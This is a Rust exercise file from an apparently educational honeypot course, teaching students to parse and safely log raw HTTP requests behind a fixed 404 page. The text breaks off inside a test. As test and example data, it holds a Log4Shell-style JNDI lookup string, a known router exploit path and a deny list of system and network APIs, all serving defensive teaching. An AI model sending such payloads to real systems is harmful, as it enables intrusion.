//! # Stage 8: A fake web service
//!
//! Telnet shows you what botnets do with weak logins. Most newly announced vulnerabilities are in
//! web software, though, and the way to see them being tried is to answer on a web port and write
//! down every request in full. In this stage the honeypot learns to:
//! - read an HTTP request by hand, as raw bytes, without a web crate
//! - find the method, the path and the headers, and clean each one before it's stored
//! - keep the body byte for byte, encoded so it can't affect your terminal
//! - cut off anything too long, mark it, and still record how much arrived
//! - answer every request with the same fixed page, built into the program
//!
//! Nothing is ever served, run or followed. There are no files behind the page, no redirects and
//! no proxying, and links in a request are never opened. This file can't read files, start
//! programs or connect to anything, and a test fails if that ever changes. That's safety rules 1
//! and 2 in the README.
//!
//! A web visit's log line names the service and has an `http` part at the end:
//!
//! ```text
//! {"time":1761935000,"source_ip":"203.0.113.7","outcome":"requested","username":null,"password":null,"service":"http","http":{"method":"POST","target":"/cgi-bin/x?a=1","version":"HTTP/1.1","headers":[["Host","198.51.100.1"],["Content-Length","5"]],"body":"aGVsbG8=","received_bytes":93,"truncated":false}}
//! ```
//!
//! `body` is base64, which Exercise 5 writes. `base64 -d` on Linux and the report tool from
//! Stage 9 turn it back into bytes, which you look at, and never run.
//!
//! Do the exercises in order, replacing each `todo!()`. Run one exercise's tests with
//! `cargo test fake_web::tests::ex1_`. Run all of Stage 8 with `cargo test fake_web`.
//!
//! The tests named `guard_` already pass, and they should never stop passing. They protect the
//! safety rules, whatever else changes.
//!
//! `cargo run` still works as it did, because the web service stays off unless you pass
//! `--web-listen`. With that flag, every web visit fails with "not yet implemented" until you've
//! finished this stage, and the telnet login carries on as before.

// While the exercises are full of `todo!()`, some arguments, imports and other code aren't used,
// and the compiler warns about it. This line silences those warnings.
// Delete this comment and the line below once you've finished the stage.
#![allow(dead_code, unused_variables, unused_imports)]

use std::io::{self, Read, Write};

use serde::{Serialize, Serializer};

use crate::login::escape_for_log;
use crate::visit::{Outcome, Visit, outcome_of_error};

/// The name that goes in a web visit's `service`.
pub const WEB_SERVICE: &str = "http";

/// The most a request line and its headers can take: 8 KB, which is what many real web servers
/// allow. Anything longer is cut off and marked.
pub const MAX_HEAD_BYTES: usize = 8 * 1024;

/// The most of a body that gets stored: 16 KB. Exploits are nearly always much shorter. The rest is
/// still read and counted, so the log shows how big it really was.
pub const MAX_BODY_BYTES: usize = 16 * 1024;

/// The most headers that get stored. Real browsers send about 15.
pub const MAX_HEADERS: usize = 64;

/// The longest method that counts as one. The longest real one, `PROPPATCH`, has 9 letters.
pub const MAX_METHOD_LETTERS: usize = 16;

/// How much of a path the screen shows. The log always has all of it.
pub const MAX_SCREEN_PATH_CHARS: usize = 60;

/// What one address's web visits can add to the log each day: 2 MB. After that its requests are
/// closed without being read. This is the same kind of budget as the fake shell's.
pub const MAX_WEB_BYTES_PER_IP: u64 = 2 * 1024 * 1024;

/// What all web visits together can add to the log each day: 20 MB.
pub const MAX_WEB_BYTES_PER_DAY: u64 = 20 * 1024 * 1024;

// ---------------------------------------------------------------------------
// What the web service says
// ---------------------------------------------------------------------------

// This is every byte the web service can ever send. It's the same for every request, and it's
// `&'static str`, so as in Stage 7 the compiler refuses to let anything a visitor sent into it.
// It's a plain "not found", with no server name and nothing that looks like a real product or
// company, which is safety rule 5. `Connection: close` tells the visitor that one request is all
// they get.

/// The page every request gets.
pub const PAGE: &str = "<!DOCTYPE html>\n<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>\n";

/// What goes in front of the page. A test checks that `Content-Length` matches `PAGE`.
pub const RESPONSE_HEAD: &str = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\nContent-Length: 102\r\nConnection: close\r\n\r\n";

// ---------------------------------------------------------------------------
// Finding the pieces of a request
// ---------------------------------------------------------------------------

/// EXERCISE 1: find where a request's head ends.
///
/// An HTTP request is a request line, then headers, one per line, then a blank line, then maybe a
/// body:
///
/// ```text
/// GET /index.html HTTP/1.1\r\n
/// Host: 198.51.100.1\r\n
/// \r\n
/// ```
///
/// Return the position just after the blank line, which is where the body starts, or `None` if
/// there's no blank line yet. Lines should end with `\r\n`, but some scanners send only `\n`, so
/// accept `\n\n` as well, and return whichever comes first.
///
/// The new idea is working with raw bytes. A request isn't text until you've checked, so this
/// takes `&[u8]`, a slice of bytes. Slices have their own iterators:
///
/// ```text
/// bytes.windows(4)          // every run of 4 bytes in a row: [0..4], [1..5], [2..6], ...
///     .position(|window| window == b"\r\n\r\n")
/// ```
///
/// `b"..."` is a byte string, a `&[u8; N]` instead of a `&str`. `position` is `findIndex` in JS.
///
/// Hints:
/// - `position` gives where the window starts, so add its length to get where it ends.
/// - Find both, then `match` on the pair. If both are there, `.min()` of the two ends is the one
///   that comes first.
pub fn find_head_end(bytes: &[u8]) -> Option<usize> {
    todo!()
}

/// EXERCISE 2: split a request line into its method, target and version.
///
/// ```text
/// GET /index.html?id=1 HTTP/1.1      →  Some(("GET", "/index.html?id=1", "HTTP/1.1"))
/// ```
///
/// It's only a request line if all of these are true. Return `None` otherwise:
/// - there are exactly three words, separated by spaces
/// - the method is 1 to `MAX_METHOD_LETTERS` letters, all uppercase `A` to `Z`
/// - the version starts with `HTTP/`
///
/// Plenty of what arrives on a web port isn't HTTP at all, like TLS handshakes and other
/// protocols' probes. That's worth keeping too, and Exercise 6 decides what to do with it.
///
/// The new idea is collecting an iterator into a `Vec`, then matching on the shape of a slice:
///
/// ```text
/// let words: Vec<&str> = line.split(' ').collect();
/// match words.as_slice() {
///     [first, second, third] => ...,   // exactly three
///     _ => ...,                        // any other number
/// }
/// ```
///
/// Hints:
/// - Split on `' '`, not `split_whitespace`. Two spaces in a row would give an empty word, and a
///   real request never has one.
/// - `method.bytes().all(|byte| byte.is_ascii_uppercase())` checks every letter.
pub fn parse_request_line(line: &str) -> Option<(&str, &str, &str)> {
    todo!()
}

/// EXERCISE 3: read the headers, one per line, until the blank line.
///
/// Each header is `Name: value`. Store the name and the value with the spaces around them
/// trimmed, and both cleaned with `escape_for_log`. A line with no `:` isn't a header, but it's
/// still something a visitor sent, so keep it as a name with an empty value. Stop at the first
/// blank line, and keep at most `MAX_HEADERS`.
///
/// The new idea is a chain of iterator adapters. Each one wraps the one before, and nothing
/// happens until `collect` asks for the results, a bit like a generator pipeline in Python:
///
/// ```text
/// lines
///     .take_while(|line| ...)   // stop at the first line where this is false
///     .take(MAX_HEADERS)        // and after this many
///     .map(|line| ...)          // turn each line into a pair
///     .collect()
/// ```
///
/// `lines` is any iterator of `&str`. The tests pass a few lines, and Exercise 6 passes what's
/// left of the head after the request line.
///
/// Hint: `split_once(':')` stops at the first `:`, so a value like `http://x` stays whole.
pub fn parse_headers<'a>(lines: impl Iterator<Item = &'a str>) -> Vec<(String, String)> {
    todo!()
}

/// EXERCISE 4: find how long the body is meant to be.
///
/// The `Content-Length` header says how many bytes of body follow the head. Header names don't
/// care about case, so `content-length` counts too. Return the number from the first one there
/// is, or `None` if there isn't one or it isn't a number.
///
/// The new idea is `find_map`, which goes through a list until a closure gives back `Some`, and
/// returns that. It's `.find()` and `.map()` in one:
///
/// ```text
/// headers.iter().find_map(|(name, value)| ...)
/// ```
///
/// Hints:
/// - `name.eq_ignore_ascii_case("content-length")` compares without caring about case.
/// - `value.parse::<usize>().ok()` turns the text into a number, or `None`. `.ok()` turns a
///   `Result` into an `Option`.
/// - A visitor can claim any length they like. That's fine, because the reading in Exercise 8
///   stops at the visit's deadline whatever they claim.
pub fn content_length(headers: &[(String, String)]) -> Option<usize> {
    todo!()
}

/// The 64 characters base64 uses, in order.
pub const BASE64_ALPHABET: &[u8; 64] =
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// EXERCISE 5: encode bytes as base64.
///
/// A body can hold anything, including bytes that aren't text and escape codes for your terminal.
/// Base64 turns any bytes into plain letters, digits, `+` and `/`, and you can always turn it back
/// into the exact bytes that arrived. It's what `btoa` does in JS and `base64.b64encode` in Python.
///
/// Every 3 bytes become 4 characters. 3 bytes are 24 bits, and each character holds 6 of them:
///
/// ```text
/// bytes        h        i        !
/// bits      01101000 01101001 00100001
/// in sixes  011010 000110 100100 100001
/// numbers     26      6     36     33
/// letters     a       G     k      h        →  "aGkh"
/// ```
///
/// If the last group is short, pad it with zero bits and finish with `=` for each missing byte:
/// `"hi"` is `"aGk="` and `"h"` is `"aA=="`.
///
/// The new idea is bit operations, the same as in JS and Python: `<<` and `>>` shift bits left and
/// right, `|` joins them and `& 0b111111` keeps the lowest 6. They work on whole numbers, so turn
/// each `u8` into a `u32` first with `u32::from(byte)`.
///
/// Hints:
/// - `bytes.chunks(3)` gives you the groups of 3, and the last one can be shorter.
/// - Put a group into one number: `(first << 16) | (second << 8) | third`, using 0 for a missing
///   byte. `chunk.get(1)` gives an `Option<&u8>`, which helps there.
/// - The first character is `(group >> 18) & 0b111111`, the second `>> 12`, and so on. Use the
///   number as a position in `BASE64_ALPHABET`, then `char::from(...)` to push it onto a `String`.
pub fn encode_base64(bytes: &[u8]) -> String {
    todo!()
}

// This is a worked example, not an exercise. `serialize_with` below tells `serde` to write the
// body with this function instead of as a list of numbers. That's the new idea in the struct: a
// `serde` attribute that changes how one field is written, without changing its type.
fn as_base64<S: Serializer>(bytes: &[u8], serializer: S) -> Result<S::Ok, S::Error> {
    serializer.serialize_str(&encode_base64(bytes))
}

// ---------------------------------------------------------------------------
// One request
// ---------------------------------------------------------------------------

/// Everything one web visitor sent, as it goes in the log.
///
/// The method, target, version and headers are text a visitor typed, so they're cleaned before
/// they're stored. The body is kept as the exact bytes, and written to the log as base64.
///
/// If the request line wasn't HTTP, the method, target and version are empty, there are no
/// headers, and the body holds everything that arrived. So nothing anyone sends is lost, and
/// nothing is stored that hasn't been cleaned or encoded.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct HttpRequest {
    pub(crate) method: String,
    pub(crate) target: String,
    pub(crate) version: String,
    pub(crate) headers: Vec<(String, String)>,
    #[serde(serialize_with = "as_base64")]
    pub(crate) body: Vec<u8>,
    pub(crate) received_bytes: usize,
    pub(crate) truncated: bool,
    // `skip` leaves this out of the log. It's only here so the screen can say how big the body was.
    #[serde(skip)]
    pub(crate) head_bytes: usize,
}

impl HttpRequest {
    fn empty() -> HttpRequest {
        HttpRequest {
            method: String::new(),
            target: String::new(),
            version: String::new(),
            headers: Vec::new(),
            body: Vec::new(),
            received_bytes: 0,
            truncated: false,
            head_bytes: 0,
        }
    }

    /// EXERCISE 6: build a request from its head.
    ///
    /// `head` is everything up to and including the blank line, or everything that arrived if
    /// there never was one. Start from `HttpRequest::empty()`, set `received_bytes` to the head's
    /// length, and then:
    ///
    /// - If the first line is a request line, store its three parts, cleaned with
    ///   `escape_for_log`, and the headers from the lines after it. Set `head_bytes` to the head's
    ///   length too, so Exercise 9 can tell how much of what arrived was body.
    /// - If it isn't, store the whole head as the body with `add_body`, so it's kept byte for byte.
    ///   Then set `received_bytes` back to the head's length, because `add_body` counts too.
    /// - Either way, if the head has no end and it's `MAX_HEAD_BYTES` long, it was cut off, so set
    ///   `truncated`.
    ///
    /// The new idea is turning bytes into text only when you need text. Checking the request line
    /// needs `&str`, so use `String::from_utf8_lossy(head)`, as `read_answer` does in Stage 1.
    /// The body never goes through that, so its bytes stay exactly as they were.
    ///
    /// Hints:
    /// - `text.lines()` handles `\r\n` and `\n`. Call `.next()` on it once for the request line,
    ///   and then pass what's left straight to `parse_headers`.
    /// - `.unwrap_or("")` gives you a first line even when the head is empty.
    pub fn from_head(head: &[u8]) -> HttpRequest {
        todo!()
    }

    /// EXERCISE 7: add some of the body, if there's room.
    ///
    /// Add every byte to `received_bytes`, whether it's stored or not. Store as many as fit under
    /// `MAX_BODY_BYTES`, and if any don't fit, set `truncated`. A body arrives in pieces, so this
    /// gets called once for each piece, and the limit is for all of them together.
    ///
    /// The new idea is slicing bytes, which works like slicing text: `&bytes[..count]` is the
    /// first `count` bytes, and no bytes get copied until you ask.
    ///
    /// Hints:
    /// - `MAX_BODY_BYTES.saturating_sub(self.body.len())` is the room left. `saturating_sub`
    ///   stops at 0 instead of crashing, like `max(0, a - b)` in Python.
    /// - `self.body.extend_from_slice(...)` adds bytes to the end of a `Vec<u8>`.
    pub fn add_body(&mut self, bytes: &[u8]) {
        todo!()
    }

    /// EXERCISE 9: describe a request on one line, for showing on screen.
    ///
    /// ```text
    /// http: GET /index.html headers=5 body=0
    /// http: POST /cgi-bin/luci/;stok=/locale headers=3 body=120 truncated
    /// http: (not http) headers=0 body=24
    /// ```
    ///
    /// Show the method and the path, and only count the headers and the body. Headers can hold
    /// passwords and cookies, and a query string after `?` often holds tokens, so leave that off
    /// the path. Show at most `MAX_SCREEN_PATH_CHARS` characters of the path, and add `...` if
    /// you cut it short. Show `(not http)` instead of the method and path if there's no method,
    /// and add ` truncated` at the end if the request was cut off.
    ///
    /// The new idea is counting characters, not bytes. `&path[..60]` would crash if byte 60 were in
    /// the middle of a character like `é`, because a `&str` must always be valid text. So use
    /// `path.chars().take(MAX_SCREEN_PATH_CHARS).collect::<String>()`, and compare
    /// `path.chars().count()` to see whether anything was left off.
    ///
    /// Hint: `self.target.split('?').next()` gives the part before any `?`. It's always `Some`,
    /// so `.unwrap_or("")` is only there to satisfy the types.
    pub fn screen_summary(&self) -> String {
        todo!()
    }
}

// This is a worked example, not an exercise. It reads until the blank line at the end of the head,
// or until `MAX_HEAD_BYTES`, or until the visitor stops sending. A read can bring in some of the
// body along with the end of the head, so it gives back the head, and then anything after it.
//
// A visitor who sends nothing gives an empty head. The reader from Stage 4 turns a timeout into
// "end of input", so going quiet ends this too.
pub fn read_head(reader: &mut impl Read) -> io::Result<(Vec<u8>, Vec<u8>)> {
    let mut received = Vec::new();
    let mut chunk = [0; 1024];
    loop {
        if let Some(end) = find_head_end(&received) {
            let rest = received.split_off(end);
            return Ok((received, rest));
        }
        if received.len() >= MAX_HEAD_BYTES {
            return Ok((received, Vec::new()));
        }
        let room = (MAX_HEAD_BYTES - received.len()).min(chunk.len());
        match reader.read(&mut chunk[..room]) {
            Ok(0) => return Ok((received, Vec::new())),
            Ok(count) => received.extend_from_slice(&chunk[..count]),
            Err(error) if error.kind() == io::ErrorKind::Interrupted => {}
            Err(error) => return Err(error),
        }
    }
}

// ---------------------------------------------------------------------------
// Running a web visit
// ---------------------------------------------------------------------------

impl Visit {
    /// EXERCISE 8: read one request, write it down, and send the page.
    ///
    /// This is where the stage comes together. As with `ask_for_answers` in Stage 2, each piece
    /// goes into `self` as soon as you have it, so a `?` that leaves early can't lose it.
    ///
    /// Do these in order:
    /// 1. `read_head(reader)?`, which gives you the head and the start of the body. If the head is
    ///    empty, they sent nothing, so return `Ok(())`. Nothing gets sent to someone who sent
    ///    nothing.
    /// 2. Build the request with `HttpRequest::from_head`, and work out how much body to expect
    ///    with `content_length`. No `Content-Length` means no body, so expect 0.
    /// 3. Add the start of the body with `add_body`, but no more of it than you expect. Then put
    ///    the request in `self.http`.
    /// 4. While more body is expected, read it in chunks and add each one to the request in
    ///    `self.http`. Stop early if a read gives 0, which means they've stopped sending.
    /// 5. Write `RESPONSE_HEAD` and then `PAGE`, and flush.
    ///
    /// The new idea is changing something inside an `Option` where it is:
    ///
    /// ```text
    /// if let Some(request) = &mut self.http {
    ///     request.add_body(...);
    /// }
    /// ```
    ///
    /// Hints:
    /// - `rest.len().min(expected)` is how much of `rest` belongs to the body.
    /// - Keep a count of what's still expected, and read into `[0; 1024]`. `&mut chunk[..count]`
    ///   reads no more than `count` bytes, so you never read past the end of the body.
    pub fn exchange_web_request(
        &mut self,
        reader: &mut impl Read,
        writer: &mut impl Write,
    ) -> io::Result<()> {
        todo!()
    }

    // This is a worked example, not an exercise. It's `run_fake_login` from Stage 2 for the web:
    // whatever goes wrong, there's still a visit to log. Anyone who sent a request is `Requested`,
    // even if the connection broke while the page was going back.
    pub fn run_web_request(&mut self, reader: &mut impl Read, writer: &mut impl Write) {
        self.service = Some(WEB_SERVICE);
        if let Err(error) = self.exchange_web_request(reader, writer) {
            self.outcome = outcome_of_error(&error);
        }
        if self.http.is_some() {
            self.outcome = Outcome::Requested;
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
//
// You don't need to change anything below, but do read the tests: they show exactly how your code
// is going to be used.
//
// Connections in these tests only ever use localhost, and the logs are made up and go in
// throwaway folders, never your real `logs` folder.

#[cfg(test)]
mod tests {
    use super::*;
    use crate::deploy::{Settings, code_only, forbidden_uses};
    use crate::fake_shell::ShellBudget;
    use crate::log_files::{DailyLog, dated_log_files, screen_line, today};
    use crate::login::listen_on_localhost;
    use crate::server::{Limits, Shared, handle_web_visit, serve_next_with};
    use std::env;
    use std::fs::{self, DirBuilder};
    use std::net::{IpAddr, Ipv4Addr, TcpStream};
    use std::os::unix::fs::DirBuilderExt;
    use std::path::PathBuf;
    use std::time::{Duration, UNIX_EPOCH};

    const LOCALHOST: IpAddr = IpAddr::V4(Ipv4Addr::LOCALHOST);
    const IP_A: IpAddr = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 1));
    const LONG_LIMIT: Duration = Duration::from_secs(20);

    // Words that must never come back. This is what a visitor's own text looks like.
    const MARKER: &str = "XYZZY";

    const SIMPLE_GET: &[u8] =
        b"GET /index.html HTTP/1.1\r\nHost: 198.51.100.1\r\nUser-Agent: test\r\n\r\n";

    // A folder that belongs to one test, deleted when the test ends, as in Stage 3.
    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(test_name: &str) -> TestDir {
            let name = format!("honeypot-web-test-{}-{test_name}", std::process::id());
            let path = env::temp_dir().join(name);
            let _ = fs::remove_dir_all(&path);
            DirBuilder::new().mode(0o700).create(&path).unwrap();
            TestDir { path }
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }

    // A pretend visitor who sends some bytes and then goes quiet, as in Stage 2.
    struct ThenQuiet<'a> {
        bytes: &'a [u8],
    }

    impl Read for ThenQuiet<'_> {
        fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
            if self.bytes.is_empty() {
                return Err(io::ErrorKind::WouldBlock.into());
            }
            let count = self.bytes.len().min(buffer.len());
            buffer[..count].copy_from_slice(&self.bytes[..count]);
            self.bytes = &self.bytes[count..];
            Ok(count)
        }
    }

    // A pretend connection that hands over one byte per read, so every message gets cut up.
    struct OneByteAtATime<'a> {
        bytes: &'a [u8],
    }

    impl Read for OneByteAtATime<'_> {
        fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
            match self.bytes.split_first() {
                Some((first, rest)) if !buffer.is_empty() => {
                    buffer[0] = *first;
                    self.bytes = rest;
                    Ok(1)
                }
                _ => Ok(0),
            }
        }
    }

    fn blank_visit() -> Visit {
        Visit::new(UNIX_EPOCH + Duration::from_secs(1000), LOCALHOST)
    }

    // Runs a web visit on what someone sent. Gives back the visit and what was sent back.
    fn web_visit_for(sent: &[u8]) -> (Visit, Vec<u8>) {
        let mut visit = blank_visit();
        let mut reply = Vec::new();
        let mut reader = sent;
        visit.run_web_request(&mut reader, &mut reply);
        (visit, reply)
    }

    fn request_of(visit: &Visit) -> &HttpRequest {
        visit.http.as_ref().unwrap()
    }

    fn the_page() -> Vec<u8> {
        [RESPONSE_HEAD.as_bytes(), PAGE.as_bytes()].concat()
    }

    fn pair(name: &str, value: &str) -> (String, String) {
        (name.to_string(), value.to_string())
    }

    fn post_with_body(body: &[u8]) -> Vec<u8> {
        let head = format!(
            "POST /upload HTTP/1.1\r\nContent-Length: {}\r\n\r\n",
            body.len()
        );
        [head.as_bytes(), body].concat()
    }

    fn server_with_web(dir: &TestDir, budget: ShellBudget) -> Shared {
        let log = DailyLog::open(&dir.path, today()).unwrap();
        Shared::new(log, Limits::new(10, 10), 1_000_000, LONG_LIMIT)
            .unwrap()
            .with_fake_web(budget)
    }

    fn logged_visits(dir: &TestDir) -> Vec<serde_json::Value> {
        let mut visits = Vec::new();
        for (path, _) in dated_log_files(&dir.path).unwrap() {
            for line in fs::read_to_string(path).unwrap().lines() {
                visits.push(serde_json::from_str(line).unwrap());
            }
        }
        visits
    }

    // Sends a request over a real connection on localhost, and gives back the reply.
    fn send_for_real(shared: &Shared, request: &[u8]) -> Vec<u8> {
        let listener = listen_on_localhost(0).unwrap();
        let mut visitor = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        visitor
            .set_read_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        visitor.write_all(request).unwrap();
        serve_next_with(&listener, shared, handle_web_visit).unwrap();
        let mut reply = Vec::new();
        let _ = visitor.read_to_end(&mut reply);
        reply
    }

    // The server handles visitors on their own threads, so a missing piece would only show up
    // there as a strange failure. This tries each piece on the test's own thread first, so you see
    // "not yet implemented" instead.
    fn check_the_pieces_first() {
        web_visit_for(SIMPLE_GET);
        request_of(&web_visit_for(SIMPLE_GET).0).screen_summary();
    }

    // -----------------------------------------------------------------------
    // Guards: these already pass, and they should never stop passing.
    // -----------------------------------------------------------------------

    // Everything in this file works on bytes and on whatever reader and writer it's handed, as in
    // Stage 7. A web service that could open files is one bug away from serving them.
    #[test]
    fn guard_this_file_cannot_touch_the_system() {
        let source = fs::read_to_string("src/fake_web.rs").unwrap();
        let never_here = [
            "std::fs",
            "fs::",
            "std::process",
            "process::",
            "Command::",
            "std::env",
            "std::os",
            "std::thread",
            "std::net",
            "TcpStream",
            "TcpListener",
            "UdpSocket",
            "File::",
            "OpenOptions",
            "include_",
        ];
        let found = forbidden_uses(code_only(&source), &never_here);
        assert!(found.is_empty(), "these lines break the rules: {found:#?}");
    }

    #[test]
    fn guard_the_page_says_how_long_it_is() {
        let expected = format!("Content-Length: {}\r\n", PAGE.len());
        assert!(RESPONSE_HEAD.contains(&expected), "{RESPONSE_HEAD:?}");
        assert!(RESPONSE_HEAD.ends_with("\r\n\r\n"));
    }

    // No redirects, no server name, and the connection always closes after one request.
    #[test]
    fn guard_the_reply_never_sends_anyone_anywhere() {
        let head = RESPONSE_HEAD.to_ascii_lowercase();
        assert!(head.starts_with("http/1.1 404 "));
        for never in [
            "location:",
            "server:",
            "refresh",
            "set-cookie:",
            "keep-alive",
        ] {
            assert!(!head.contains(never), "{never}");
        }
        assert!(head.contains("connection: close\r\n"));
        let page = PAGE.to_ascii_lowercase();
        for never in [
            "http://", "https://", "<script", "<form", "<meta", "href", "src=",
        ] {
            assert!(!page.contains(never), "{never}");
        }
    }

    // A visitor's text only lasts as long as their connection. If the reply could ever borrow from
    // it, this stops compiling.
    #[test]
    fn guard_the_reply_is_always_text_built_into_the_program() {
        let head: &'static str = RESPONSE_HEAD;
        let page: &'static str = PAGE;
        assert!(!head.is_empty() && !page.is_empty());
    }

    #[test]
    fn guard_without_the_flag_there_is_no_web_service() {
        let args: Vec<String> = ["--listen", "0.0.0.0:2323", "--checklist-done"]
            .iter()
            .map(|arg| arg.to_string())
            .collect();
        assert_eq!(Settings::from_args(&args).unwrap().web_listen(), None);
    }

    // The web port follows the same rule as the telnet one: localhost, unless the checklist is done.
    #[test]
    fn guard_the_web_address_is_checked_too() {
        let args = |text: &str| -> Vec<String> { text.split(' ').map(String::from).collect() };
        assert!(Settings::from_args(&args("--web-listen 0.0.0.0:8080")).is_err());
        assert!(Settings::from_args(&args("--web-listen [::1]:8080")).is_err());
        assert!(Settings::from_args(&args("--web-listen")).is_err());
        let local = Settings::from_args(&args("--web-listen 127.0.0.1:8080")).unwrap();
        assert_eq!(local.web_listen(), Some("127.0.0.1:8080".parse().unwrap()));
        let live = Settings::from_args(&args("--web-listen 0.0.0.0:8080 --checklist-done"));
        assert!(live.is_ok());
    }

    #[test]
    fn guard_a_telnet_visit_still_looks_as_it_did() {
        let line = blank_visit().to_json_line().unwrap();
        assert_eq!(
            line,
            r#"{"time":1000,"source_ip":"127.0.0.1","outcome":"left","username":null,"password":null}"#
        );
    }

    // -----------------------------------------------------------------------
    // The exercises
    // -----------------------------------------------------------------------

    #[test]
    fn ex1_finds_the_end_of_the_head() {
        assert_eq!(find_head_end(SIMPLE_GET), Some(SIMPLE_GET.len()));
        assert_eq!(find_head_end(b"GET / HTTP/1.0\r\n\r\nbody"), Some(18));
    }

    #[test]
    fn ex1_accepts_bare_newlines() {
        assert_eq!(find_head_end(b"GET / HTTP/1.0\n\nbody"), Some(16));
    }

    #[test]
    fn ex1_takes_whichever_comes_first() {
        assert_eq!(find_head_end(b"GET / HTTP/1.0\n\n\r\n\r\n"), Some(16));
        assert_eq!(find_head_end(b"A\r\n\r\nB\n\n"), Some(5));
    }

    #[test]
    fn ex1_no_blank_line_yet_is_none() {
        assert_eq!(find_head_end(b"GET / HTTP/1.1\r\nHost: x\r\n"), None);
        assert_eq!(find_head_end(b""), None);
        assert_eq!(find_head_end(b"\r\n"), None);
    }

    #[test]
    fn ex1_survives_bytes_that_are_not_text() {
        assert_eq!(find_head_end(&[0xff, 0x00, 0x16, 0x03, 0x01]), None);
        assert_eq!(find_head_end(&[0xff, b'\n', b'\n', 0xfe]), Some(3));
    }

    #[test]
    fn ex2_splits_a_request_line() {
        assert_eq!(
            parse_request_line("GET /index.html?id=1 HTTP/1.1"),
            Some(("GET", "/index.html?id=1", "HTTP/1.1"))
        );
        assert_eq!(
            parse_request_line("PROPFIND / HTTP/1.0"),
            Some(("PROPFIND", "/", "HTTP/1.0"))
        );
    }

    #[test]
    fn ex2_needs_exactly_three_words() {
        assert_eq!(parse_request_line("GET /"), None);
        assert_eq!(parse_request_line("GET / HTTP/1.1 extra"), None);
        assert_eq!(parse_request_line("GET  / HTTP/1.1"), None);
        assert_eq!(parse_request_line(""), None);
    }

    #[test]
    fn ex2_the_method_is_uppercase_letters() {
        assert_eq!(parse_request_line("get / HTTP/1.1"), None);
        assert_eq!(parse_request_line("G3T / HTTP/1.1"), None);
        assert_eq!(parse_request_line("GETGETGETGETGETGET / HTTP/1.1"), None);
    }

    #[test]
    fn ex2_the_version_starts_with_http() {
        assert_eq!(parse_request_line("GET / FTP/1.1"), None);
        assert_eq!(parse_request_line("SSH-2.0-client x y"), None);
    }

    #[test]
    fn ex2_survives_text_that_is_not_ascii() {
        assert_eq!(
            parse_request_line("GET /café HTTP/1.1"),
            Some(("GET", "/café", "HTTP/1.1"))
        );
        assert_eq!(parse_request_line("GÉT / HTTP/1.1"), None);
    }

    #[test]
    fn ex3_reads_headers() {
        let headers = parse_headers(["Host: 198.51.100.1", "Accept:*/*"].into_iter());
        assert_eq!(
            headers,
            [pair("Host", "198.51.100.1"), pair("Accept", "*/*")]
        );
    }

    #[test]
    fn ex3_stops_at_the_blank_line() {
        let headers = parse_headers(["A: 1", "", "B: 2"].into_iter());
        assert_eq!(headers, [pair("A", "1")]);
    }

    #[test]
    fn ex3_a_value_can_hold_a_colon() {
        let headers = parse_headers(["Referer: http://example.com:8080/"].into_iter());
        assert_eq!(headers, [pair("Referer", "http://example.com:8080/")]);
    }

    #[test]
    fn ex3_a_line_with_no_colon_is_kept() {
        let headers = parse_headers(["not a header"].into_iter());
        assert_eq!(headers, [pair("not a header", "")]);
    }

    #[test]
    fn ex3_cleans_names_and_values() {
        let headers = parse_headers(["X-\u{1b}[31m: ${jndi:ldap://x}\u{7}"].into_iter());
        assert_eq!(headers, [pair("X-\\u{1b}[31m", "${jndi:ldap://x}\\u{7}")]);
    }

    #[test]
    fn ex3_keeps_at_most_the_limit() {
        let lines: Vec<String> = (0..MAX_HEADERS + 10).map(|n| format!("H{n}: v")).collect();
        let headers = parse_headers(lines.iter().map(String::as_str));
        assert_eq!(headers.len(), MAX_HEADERS);
        assert_eq!(headers[0], pair("H0", "v"));
    }

    #[test]
    fn ex4_finds_the_length() {
        let headers = [pair("Host", "x"), pair("Content-Length", "42")];
        assert_eq!(content_length(&headers), Some(42));
    }

    #[test]
    fn ex4_ignores_the_case_of_the_name() {
        assert_eq!(content_length(&[pair("content-length", "7")]), Some(7));
        assert_eq!(content_length(&[pair("CONTENT-LENGTH", "7")]), Some(7));
    }

    #[test]
    fn ex4_takes_the_first_one() {
        let headers = [pair("Content-Length", "1"), pair("Content-Length", "2")];
        assert_eq!(content_length(&headers), Some(1));
    }

    #[test]
    fn ex4_none_or_nonsense_is_none() {
        assert_eq!(content_length(&[pair("Host", "x")]), None);
        assert_eq!(content_length(&[pair("Content-Length", "-5")]), None);
        assert_eq!(content_length(&[pair("Content-Length", "lots")]), None);
        assert_eq!(content_length(&[]), None);
    }

    #[test]
    fn ex5_encodes_whole_groups() {
        assert_eq!(encode_base64(b"hi!"), "aGkh");
        assert_eq!(encode_base64(b"hello world!"), "aGVsbG8gd29ybGQh");
    }

    #[test]
    fn ex5_pads_a_short_group() {
        assert_eq!(encode_base64(b"hi"), "aGk=");
        assert_eq!(encode_base64(b"h"), "aA==");
        assert_eq!(encode_base64(b"hello"), "aGVsbG8=");
    }

    #[test]
    fn ex5_nothing_is_nothing() {
        assert_eq!(encode_base64(b""), "");
    }

    #[test]
    fn ex5_any_byte_works() {
        assert_eq!(encode_base64(&[0, 0, 0]), "AAAA");
        assert_eq!(encode_base64(&[255, 255, 255]), "////");
        assert_eq!(encode_base64(&[0xfb, 0xff]), "+/8=");
        assert_eq!(encode_base64(&[0x1b, b'[', b'2', b'J']), "G1sySg==");
    }

    #[test]
    fn ex5_only_ever_uses_plain_characters() {
        let every_byte: Vec<u8> = (0..=255).collect();
        let text = encode_base64(&every_byte);
        assert_eq!(text.len(), 344);
        assert!(
            text.bytes()
                .all(|byte| BASE64_ALPHABET.contains(&byte) || byte == b'=')
        );
    }

    #[test]
    fn ex6_reads_a_request() {
        let request = HttpRequest::from_head(SIMPLE_GET);
        assert_eq!(request.method, "GET");
        assert_eq!(request.target, "/index.html");
